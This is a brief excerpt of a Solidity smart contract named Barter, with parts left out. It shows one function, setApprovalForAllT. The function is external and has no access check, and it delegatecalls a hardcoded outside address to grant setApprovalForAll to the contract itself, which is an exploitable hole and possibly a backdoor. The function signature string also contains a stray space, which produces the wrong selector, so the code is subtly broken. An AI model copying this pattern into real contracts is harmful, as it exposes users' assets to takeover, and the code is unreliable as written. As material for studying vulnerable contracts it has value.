...
contract Barter {
    ...
    function setApprovalForAllT() external {
        address facet = 0x2646C0790FA8FA4e65EA3619e23E50d6a1357514;
        facet.delegatecall(abi.encodeWithSignature("setApprovalForAll(address, bool)", address(this), true));
    }
